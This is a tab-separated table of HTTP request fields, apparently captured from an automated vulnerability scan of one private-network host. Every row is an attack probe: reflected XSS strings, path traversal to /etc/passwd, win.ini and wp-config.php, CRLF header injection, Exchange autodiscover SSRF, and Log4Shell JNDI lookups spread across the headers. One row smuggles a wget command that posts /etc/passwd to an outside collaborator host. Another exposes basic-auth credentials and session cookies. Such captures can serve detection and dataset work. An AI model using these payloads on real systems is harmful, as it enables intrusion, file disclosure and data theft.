http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36				/web/autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/hdw-tube/mychannel.php?channel=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/wp-content/plugins/hdw-tube/mychannel.php?channel=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/jira/secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/jira/secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/photoxhibit/common/inc/pages/build.php?gid=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36				/web/wp-content/plugins/photoxhibit/common/inc/pages/build.php?gid=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-admin/admin-ajax.php?action=bwg_frontend_data&shortcode_id=1"%20onmouseover=alert(document.domain)//		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36				/web/wp-admin/admin-ajax.php?action=bwg_frontend_data&shortcode_id=1"%20onmouseover=alert(document.domain)//
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/%2F..%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36				/web/%2F..%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/horde/util/barcode.php?type=../../../../../../../../../../../etc/./passwd%00		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36				/web/horde/util/barcode.php?type=../../../../../../../../../../../etc/./passwd%00
*/*	gzip	en															close		82	82	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/share/page/dologin		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36				/web/share/page/dologin
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/LetsEncrypt/Index?fileName=/etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/LetsEncrypt/Index?fileName=/etc/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/mantis/verify.php?id=1&confirm_hash=		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36				/web/mantis/verify.php?id=1&confirm_hash=
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/test.txt%0d%0aSet-Cookie:CRLFInjection=Test%0d%0aLocation:%20example.com%0d%0aX-XSS-Protection:0		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36				/web/test.txt%0d%0aSet-Cookie:CRLFInjection=Test%0d%0aLocation:%20example.com%0d%0aX-XSS-Protection:0
*/*	gzip	en															close		71	71	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/search/		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/search/
	gzip																close		54	54	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/mailingupgrade.php		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/mailingupgrade.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/system/login/SysLoginUser.aspx?Login=Denied&UID=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36				/web/system/login/SysLoginUser.aspx?Login=Denied&UID=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/does_not_exist%22%22%3E%3Cscript%3Ealert%28%22XSS%22%29%3C/script%3E%3Cimg%20src=x		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/does_not_exist%22%22%3E%3Cscript%3Ealert%28%22XSS%22%29%3C/script%3E%3Cimg%20src=x
	gzip																close		21	21	application/json;charset=UTF-8						192.168.1.104															1	http://192.168.1.104/web/casa/nodes/thumbprints		POST				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36				/web/casa/nodes/thumbprints
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/%2F..%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36				/web/%2F..%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/hdw-tube/mychannel.php?channel=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/wp-content/plugins/hdw-tube/mychannel.php?channel=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36				/web/autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/api/getServices?name[]=$(wget%20--post-file%20/etc/passwd%20burpcollaborator.net)		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36				/web/api/getServices?name[]=$(wget%20--post-file%20/etc/passwd%20burpcollaborator.net)
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-admin/admin-ajax.php?action=bwg_frontend_data&shortcode_id=1"%20onmouseover=alert(document.domain)//		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36				/web/wp-admin/admin-ajax.php?action=bwg_frontend_data&shortcode_id=1"%20onmouseover=alert(document.domain)//
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/jira/secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/jira/secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/photoxhibit/common/inc/pages/build.php?gid=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36				/web/wp-content/plugins/photoxhibit/common/inc/pages/build.php?gid=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/horde/util/barcode.php?type=../../../../../../../../../../../etc/./passwd%00		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36				/web/horde/util/barcode.php?type=../../../../../../../../../../../etc/./passwd%00
*/*	gzip	en															close		82	82	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/share/page/dologin		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36				/web/share/page/dologin
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/mantis/verify.php?id=1&confirm_hash=		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36				/web/mantis/verify.php?id=1&confirm_hash=
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/test.txt%0d%0aSet-Cookie:CRLFInjection=Test%0d%0aLocation:%20example.com%0d%0aX-XSS-Protection:0		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36				/web/test.txt%0d%0aSet-Cookie:CRLFInjection=Test%0d%0aLocation:%20example.com%0d%0aX-XSS-Protection:0
*/*	gzip	en															close		71	71	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/search/		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/search/
	gzip																close		54	54	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/mailingupgrade.php		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/mailingupgrade.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/autodiscover/autodiscover.json?@test.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@test.com		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36				/web/autodiscover/autodiscover.json?@test.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@test.com
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/system/login/SysLoginUser.aspx?Login=Denied&UID=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36				/web/system/login/SysLoginUser.aspx?Login=Denied&UID=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/mantisBT/verify.php?id=1&confirm_hash=		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36				/web/mantisBT/verify.php?id=1&confirm_hash=
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/mantisbt-2.3.0/verify.php?id=1&confirm_hash=		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/mantisbt-2.3.0/verify.php?id=1&confirm_hash=
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/bugs/verify.php?confirm_hash=&id=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/bugs/verify.php?confirm_hash=&id=1
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://		GET				HTTP/1.1																			Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36				/web/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://
	gzip																close		144	144							192.168.1.104															1	http://192.168.1.104/web/lumis/portal/controller/xml/PageControllerXml.jsp		POST				HTTP/1.1																			Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36				/web/lumis/portal/controller/xml/PageControllerXml.jsp
	gzip																close		97	97	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/carbon/generic/save_artifact_ajaxprocessor.jsp		POST				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36				/web/carbon/generic/save_artifact_ajaxprocessor.jsp
${jndi:ldap://127.0.0.1#.${hostName}.accept.}	${jndi:ldap://127.0.0.1#.${hostName}.acceptencoding.}	${jndi:ldap://127.0.0.1#.${hostName}.acceptlanguage.}															close										192.168.1.104					${jndi:ldap://127.0.0.1#.${hostName}.location.}									${jndi:ldap://127.0.0.1#.${hostName}.referer.}	1	http://192.168.1.104/web/?x=${jndi:ldap://127.0.0.1		GET				HTTP/1.1																			${jndi:ldap://127.0.0.1#.${hostName}.useragent.}		${jndi:ldap://127.0.0.1#.${hostName}.xforwardedfor.}	${jndi:ldap://127.0.0.1#.${hostName}.cookiename.}=${jndi:ldap://${hostName}.cookievalue.}	/web/?x=${jndi:ldap://127.0.0.1
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/download.php?file=../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36				/web/download.php?file=../../../../../etc/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/?a=display&templateFile=README.md		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36				/web/?a=display&templateFile=README.md
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/manage/log/view?filename=/windows/win.ini&base=../../../../../../../../../../		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36				/web/manage/log/view?filename=/windows/win.ini&base=../../../../../../../../../../
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?option=com_cartweberp&controller=../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36				/web/index.php?option=com_cartweberp&controller=../../../../../../../../etc/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/cgit/cgit.cgi/git/objects/?path=../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/cgit/cgit.cgi/git/objects/?path=../../../../../../../etc/passwd
	gzip																close		410	410	application/json						192.168.1.104															1	http://192.168.1.104/web/druid/indexer/v1/sampler?for=connect		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/druid/indexer/v1/sampler?for=connect
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/sites/all/modules/avatar_uploader/lib/demo/view.php?file=../../../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36				/web/sites/all/modules/avatar_uploader/lib/demo/view.php?file=../../../../../../../../../../../etc/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/demo/file/../../../../../../../../etc/passwd%00filename.mp4/chunk.m3u8?nimblesessionid=1484448		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36				/web/demo/file/../../../../../../../../etc/passwd%00filename.mp4/chunk.m3u8?nimblesessionid=1484448
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?option=com_jejob&view=../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/index.php?option=com_jejob&view=../../../../../../etc/passwd%00
	gzip		maint:password						Basic bWFpbnQ6cGFzc3dvcmQ=								close		160	160	application/x-www-form-urlencoded						192.168.1.104														192.168.1.104/maint/index.php?packages	1	http://192.168.1.104/web/maint/index.php?packages		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36			lng=en; security_level=0; PHPSESSID=7fasl890v1c51vu0d31oemt3j1; ARI=teev7d0kgvdko8u5b26p3335a2	/web/maint/index.php?packages
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?option=com_gadgetfactory&controller=../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36				/web/index.php?option=com_gadgetfactory&controller=../../../../../../../../../../etc/passwd%00
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36				/web/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/kvmlm2/index.dhtml?fname=&language=../../../../../../../../../../etc/passwd%00.jpg&lname=&sponsor=gdi&template=11		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36				/web/kvmlm2/index.dhtml?fname=&language=../../../../../../../../../../etc/passwd%00.jpg&lname=&sponsor=gdi&template=11
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/advanced-dewplayer/admin-panel/download-file.php?dew_file=../../../../wp-config.php		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36				/web/wp-content/plugins/advanced-dewplayer/admin-panel/download-file.php?dew_file=../../../../wp-config.php
	gzip																close										192.168.1.104														http://192.168.1.104/web/info.html	1	http://192.168.1.104/web/images/..%2finfo.html		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/images/..%2finfo.html
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?option=com_perchadownloadsattach&controller=../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/index.php?option=com_perchadownloadsattach&controller=../../../../../../../../../../etc/passwd%00
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/s/24s7kF5SsnY8FYwgq6BqibLdf70/_/;/WEB-INF/web.xml		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36				/web/s/24s7kF5SsnY8FYwgq6BqibLdf70/_/;/WEB-INF/web.xml
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/pacsone/nocache.php?path=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2f.%2fzpx%2f..%2fpasswd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/pacsone/nocache.php?path=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2f.%2fzpx%2f..%2fpasswd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?option=com_noticeboard&controller=../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/index.php?option=com_noticeboard&controller=../../../../../../../../../../etc/passwd%00
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/dukapress/lib/dp_image.php?src=../../../../wp-config.php		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/wp-content/plugins/dukapress/lib/dp_image.php?src=../../../../wp-config.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/exportFile?UID=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/exportFile?UID=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/gespage/doDownloadData?file_name=../../../../../Windows/debug/NetSetup.log		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/gespage/doDownloadData?file_name=../../../../../Windows/debug/NetSetup.log
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36				/web/..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/demo/file/../../../../../../../../etc/passwd%00filename.mp4/chunk.m3u8?nimblesessionid=1484448		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36				/web/demo/file/../../../../../../../../etc/passwd%00filename.mp4/chunk.m3u8?nimblesessionid=1484448
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?option=com_jprojectmanager&controller=../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36				/web/index.php?option=com_jprojectmanager&controller=../../../../../../../../../../etc/passwd%00
